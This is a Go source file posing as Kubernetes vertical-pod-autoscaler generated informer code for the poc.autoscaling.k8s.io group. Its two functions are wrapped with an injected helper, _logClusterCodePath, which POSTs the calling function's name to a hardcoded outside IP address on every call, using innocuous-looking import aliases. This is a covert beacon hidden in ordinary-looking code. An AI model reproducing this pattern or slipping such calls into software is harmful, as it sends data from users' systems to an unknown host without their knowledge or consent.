package poc

import (
	internalinterfaces "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/informers/externalversions/internalinterfaces"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	v1alpha1 "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/informers/externalversions/poc.autoscaling.k8s.io/v1alpha1"
)

type Interface interface{ V1alpha1() v1alpha1.Interface }
type group struct {
	factory			internalinterfaces.SharedInformerFactory
	namespace		string
	tweakListOptions	internalinterfaces.TweakListOptionsFunc
}

func New(f internalinterfaces.SharedInformerFactory, namespace string, tweakListOptions internalinterfaces.TweakListOptionsFunc) Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &group{factory: f, namespace: namespace, tweakListOptions: tweakListOptions}
}
func (g *group) V1alpha1() v1alpha1.Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return v1alpha1.New(g.factory, g.namespace, g.tweakListOptions)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
